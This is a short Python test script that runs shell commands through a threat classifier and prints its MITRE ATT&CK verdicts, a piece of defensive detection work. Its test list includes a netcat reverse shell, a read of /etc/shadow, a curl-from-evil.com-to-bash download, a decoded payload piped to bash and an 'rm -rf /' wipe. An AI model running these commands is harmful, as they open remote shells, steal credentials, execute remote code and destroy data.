from engine import ThreatClassifier

clf = ThreatClassifier(
    bert_path="./bert_security_model",
    mitre_path="./mitre_attack.json"
)

test_commands = [
    "nc -e /bin/bash 192.168.1.1 4444",
    "cat /etc/shadow",
    "curl http://evil.com/shell.sh | bash",
    "base64 --decode payload.txt | bash",
    "rm -rf / --no-preserve-root",
    "ls -la",
    "apt update",
    "nmap -sV 192.168.1.0/24",
]

for cmd in test_commands:
    result = clf.analyze(cmd)
    print(f"CMD : {cmd}")
    print(f"  Verdict:     {result['verdict']}")
    print(f"  Tactic:      {result['tactic']}")
    print(f"  Technique:   {result['technique_id']}")
    print(f"  Explanation: {result['explanation'][:100]}")
    print(f"  Mitigations: {len(result['mitigations'])}")
    print()